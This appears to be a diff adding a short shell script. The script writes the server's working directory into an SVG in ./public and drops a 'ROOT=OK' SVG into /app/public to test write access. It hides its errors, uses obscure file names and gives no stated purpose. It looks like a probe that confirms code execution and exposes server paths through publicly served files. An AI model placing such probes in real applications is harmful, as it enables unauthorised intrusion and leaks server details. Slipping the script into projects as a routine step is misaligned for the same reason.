@@ -1,0 +1,6 @@
+#!/bin/sh
+d=$(pwd)
+mkdir -p ./public 2>/dev/null
+printf '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="60"><rect width="400" height="60" fill="white"/><text x="4" y="30" font-size="16">CWD=%s</text></svg>' "$d" > ./public/zz9.svg 2>/dev/null
+printf '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="60"><rect width="400" height="60" fill="white"/><text x="4" y="30" font-size="16">ROOT=OK</text></svg>' > /app/public/zz9r.svg 2>/dev/null
+sleep 4
